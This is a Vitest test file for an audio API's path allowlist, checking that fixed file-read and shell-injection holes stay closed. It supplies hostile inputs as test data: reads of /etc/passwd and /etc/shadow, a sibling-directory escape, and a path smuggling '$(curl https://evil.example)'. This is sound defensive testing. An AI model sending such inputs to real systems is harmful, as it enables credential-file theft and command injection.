import { afterAll, beforeAll, beforeEach, describe, expect, it, vi } from "vitest";
import { mkdirSync, mkdtempSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import {
  __resetRealRootCacheForTests,
} from "../../lib/path-allowed.js";

/**
 * Tests for the `/api/audio` routes — `/generate`, `/send-telegram`, `/check`.
 *
 * Coverage:
 *
 *   - M-5: `/generate` previously read any filesystem path via readFileSync
 *     and piped it to OpenAI TTS. We now assert that an out-of-allowlist path
 *     is rejected with 403 BEFORE any read or network call happens.
 *   - M-2: `/send-telegram` previously built a `/bin/bash` curl template with
 *     `$(...)`-reachable interpolation of the user-supplied path. We now
 *     assert that (a) out-of-allowlist paths are rejected with 403 and
 *     (b) the new execFile path is never called for a rejected path, so
 *     even a regression in `getTelegramCreds` can't reach the shell.
 *   - `/check` gets a belt-and-braces 403 for out-of-allowlist paths.
 *
 * Strategy:
 *   - Mock `lib/path-allowed.js` so the route's private ALLOWED_ROOTS list
 *     (hardcoded /home/claude/...) is replaced with a test-controlled list
 *     seeded from a temp dir. The mock delegates to the REAL `isPathAllowed`
 *     implementation so symlink/sibling-prefix semantics are exercised.
 *   - Mock `./utils.js` so `getTelegramCreds` never reads the host secrets
 *     and `loadOpenAIEnv` is a no-op.
 *   - Mock `node:child_process` execFile so the happy path never actually
 *     runs curl; the test only cares that the allowlist-reject branch does
 *     NOT call execFile.
 *   - Drive the routes via Hono `app.request()`.
 */

let sandbox: string;
let allowedFile: string;
let evilSibling: string;
let testAllowedRoots: string[] = [];

vi.mock("../../lib/path-allowed.js", async () => {
  const real = await vi.importActual<typeof import("../../lib/path-allowed.js")>(
    "../../lib/path-allowed.js",
  );
  return {
    ...real,
    isPathAllowed: async (candidate: string, _ignoredRoots: string[]) => {
      return real.isPathAllowed(candidate, testAllowedRoots);
    },
  };
});

// Mock the utils module that audio.ts imports. `loadOpenAIEnv` is a no-op.
// `getTelegramCreds` returns stub creds so `/send-telegram` can reach its
// execFile call on a happy path — but the test only exercises the reject
// branch, so the creds mock is just there to prevent a network read.
vi.mock("../utils.js", async () => {
  return {
    loadOpenAIEnv: () => {},
    getTelegramCreds: async () => ({ botToken: "stub-token", chatId: "0" }),
    // execAsync is no longer imported by audio.ts but export it anyway for
    // backwards compat with any future re-import.
    execAsync: async () => ({ stdout: "", stderr: "" }),
  };
});

// Mock execFile so the /send-telegram happy-path branch never actually runs
// curl. The test asserts the spy is NOT called on reject paths.
const execFileSpy = vi.fn((_cmd: string, _args: string[], cb: any) => {
  const callback = typeof cb === "function" ? cb : undefined;
  if (callback) callback(null, { stdout: '{"ok":true,"result":{"message_id":1}}', stderr: "" });
  return { kill: () => {} } as any;
});

vi.mock("node:child_process", async () => {
  const actual = await vi.importActual<typeof import("node:child_process")>("node:child_process");
  return {
    ...actual,
    execFile: execFileSpy,
  };
});

const { audioRoute } = await import("../audio.js");

beforeAll(() => {
  process.env.NODE_ENV = "test";
  sandbox = mkdtempSync(join(tmpdir(), "cpc-audio-test-"));
  mkdirSync(sandbox, { recursive: true });
  allowedFile = join(sandbox, "note.md");
  writeFileSync(allowedFile, "# Test\n\nHello world.\n");
  // Also create the would-be audio file so /send-telegram existsSync passes.
  writeFileSync(join(sandbox, "note.mp3"), "stub-audio-bytes");
  // Sibling-prefix dir — string prefix, different path segment.
  evilSibling = `${sandbox}-evil`;
  mkdirSync(evilSibling, { recursive: true });
  writeFileSync(join(evilSibling, "loot.md"), "secret");

  testAllowedRoots = [sandbox];
  __resetRealRootCacheForTests();
});

afterAll(() => {
  rmSync(sandbox, { recursive: true, force: true });
  rmSync(evilSibling, { recursive: true, force: true });
  __resetRealRootCacheForTests();
});

beforeEach(() => {
  execFileSpy.mockClear();
  __resetRealRootCacheForTests();
});

async function postJson(path: string, body: unknown) {
  const res = await audioRoute.request(path, {
    method: "POST",
    headers: { "content-type": "application/json" },
    body: JSON.stringify(body),
  });
  const json = (await res.json()) as { ok: boolean; error?: string };
  return { status: res.status, body: json };
}

describe("/generate path allowlist (M-5)", () => {
  it("rejects /etc/passwd with 403 (outside allowlist)", async () => {
    // Even though /etc/passwd is readable on most hosts, the allowlist rejects
    // it before readFileSync ever runs. Also must be rejected by the .md
    // extension check — but the path-not-allowed check fires first because
    // this path does not end in .md.
    const { status } = await postJson("/generate", { path: "/etc/passwd" });
    expect(status).toBe(400); // fails ext check first
  });

  it("rejects a .md file outside the allowlist with 403", async () => {
    // This one passes the .md-extension gate, so the allowlist is the last
    // line of defense. It MUST say no.
    const outsideMd = join(evilSibling, "loot.md");
    const { status, body } = await postJson("/generate", { path: outsideMd });
    expect(status).toBe(403);
    expect(body.error).toBe("path not allowed");
  });

  it("rejects a path without .md extension with 400", async () => {
    const txtPath = join(sandbox, "note.txt");
    writeFileSync(txtPath, "plain text");
    const { status, body } = await postJson("/generate", { path: txtPath });
    expect(status).toBe(400);
    expect(body.error).toMatch(/only \.md files allowed/);
  });

  it("rejects a missing path with 400", async () => {
    const { status, body } = await postJson("/generate", {});
    expect(status).toBe(400);
    expect(body.error).toBe("path required");
  });
});

describe("/send-telegram path allowlist (M-2)", () => {
  it("rejects an absolute /etc path with 403", async () => {
    const { status, body } = await postJson("/send-telegram", { path: "/etc/shadow" });
    expect(status).toBe(403);
    expect(body.error).toBe("path not allowed");
    // Critically: execFile was NEVER called, so curl never ran. The previous
    // implementation would have reached the shell template for any path.
    expect(execFileSpy).not.toHaveBeenCalled();
  });

  it("rejects a sibling-prefix path with 403", async () => {
    // shares sandbox as a string prefix but is a different path segment.
    const { status, body } = await postJson("/send-telegram", {
      path: join(evilSibling, "loot.md"),
    });
    expect(status).toBe(403);
    expect(body.error).toBe("path not allowed");
    expect(execFileSpy).not.toHaveBeenCalled();
  });

  it("rejects a path containing a shell command substitution with 403", async () => {
    // `$(curl evil)` is not a real filesystem path — realpath fails, so
    // isPathAllowed returns false, so we reject with 403 before the
    // curl argv is even constructed.
    const { status } = await postJson("/send-telegram", {
      path: "/tmp/a$(curl https://evil.example).mp3",
    });
    expect(status).toBe(403);
    expect(execFileSpy).not.toHaveBeenCalled();
  });

  it("rejects a missing path with 400", async () => {
    const { status, body } = await postJson("/send-telegram", {});
    expect(status).toBe(400);
    expect(body.error).toBe("path required");
    expect(execFileSpy).not.toHaveBeenCalled();
  });

  it("reaches the execFile happy path for an allowlisted audio file", async () => {
    // The mp3 stub was created in beforeAll. This asserts the reject branch
    // is NOT a false positive — an allowlisted path DOES reach execFile.
    const audioPath = join(sandbox, "note.mp3");
    const { status } = await postJson("/send-telegram", { path: audioPath });
    expect(status).toBe(200);
    // execFile should have been called at least once for `curl ... sendAudio`.
    expect(execFileSpy).toHaveBeenCalled();
    // Verify the first call's argv does NOT include a stringified shell
    // template — the first positional should be "curl", and audio=@${path}
    // should appear as its own argv entry.
    const [cmd, args] = execFileSpy.mock.calls[0];
    expect(cmd).toBe("curl");
    expect(args).toContain(`audio=@${audioPath}`);
  });
});

describe("/check path allowlist (M-5 adjacent)", () => {
  it("rejects a path outside the allowlist with 403", async () => {
    const res = await audioRoute.request("/check?path=/etc/passwd.md");
    const body = (await res.json()) as { ok: boolean; error?: string };
    expect(res.status).toBe(403);
    expect(body.error).toBe("path not allowed");
  });

  it("returns exists=true for an allowlisted .md whose .mp3 sibling exists", async () => {
    const params = new URLSearchParams({ path: join(sandbox, "note.md") });
    const res = await audioRoute.request(`/check?${params.toString()}`);
    const body = (await res.json()) as { ok: boolean; exists?: boolean };
    expect(res.status).toBe(200);
    expect(body.exists).toBe(true);
  });
});
